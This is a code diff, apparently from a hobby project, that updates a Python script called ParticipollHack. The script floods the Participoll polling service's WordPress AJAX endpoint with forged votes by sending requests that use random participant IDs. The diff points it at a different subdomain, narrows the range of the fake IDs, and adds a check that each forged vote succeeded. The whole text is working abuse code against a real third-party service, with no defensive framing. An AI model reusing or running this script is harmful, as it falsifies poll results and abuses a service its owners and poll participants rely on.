@@ -5,7 +5,7 @@ from random import randint
 
 
 class ParticipollHack:
-    def __init__(self, userID = 2453, baseURL = "http://participoll.com"):
+    def __init__(self, userID = 2453, baseURL = "http://dbs.participoll.com"):
         self.userID = userID
         self.baseURL = baseURL
         self.postVote = "/wp-content/themes/participoll/alternativeCall.php?action=run_ajax&fn=log_response&userID={0}&participantID={1}&response={2}"
@@ -17,10 +17,11 @@ class ParticipollHack:
             return 42
 
         for i in range(count):
-            participantID = randint(1, 100000)
+            participantID = randint(10000, 99999)
+
             postURL = self.baseURL + self.postVote.format(self.userID, participantID, vote)
             r = requests.post(postURL)
-            if r.status_code != 200:
+            if r.status_code != 200 or bytes(b"OK") not in r.content:
                 print("Error while sending vote :/")
                 return 1337
             if verbos:
